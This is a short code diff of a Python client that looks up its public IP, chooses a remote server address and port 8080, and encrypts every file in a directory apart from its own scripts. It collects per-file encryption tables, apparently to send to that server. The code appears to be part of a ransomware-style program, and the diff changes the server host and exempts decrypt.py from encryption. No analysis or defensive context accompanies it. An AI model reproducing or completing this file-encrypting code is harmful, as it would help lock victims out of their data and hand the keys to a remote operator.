@@ -6,7 +6,7 @@ from pysocket import PySocketClient
 from crypto import Crypto
 
 ip = requests.get("http://ip.jsontest.com").json()["ip"]
-host = "192.168.219.106" if ip == "125.182.224.34" else "http://m.moonsung.o-r.kr"
+host = "192.168.219.106" if ip == "125.182.224.34" else "125.182.224.34"
 port = 8080
 
 print(host)
@@ -20,7 +20,7 @@ def encrypt(server) :
     table_list = []
 
     for i in range(len(file_list)) :
-        if "." in file_list[i] and not file_list[i] in ["client.py", "crypto.py"] :
+        if "." in file_list[i] and not file_list[i] in ["decrypt.py", "client.py", "crypto.py"] :
             result, table = ct.encrypt_file(dir_path + "/" + file_list[i])
 
             table_list.append([file_list[i], table])
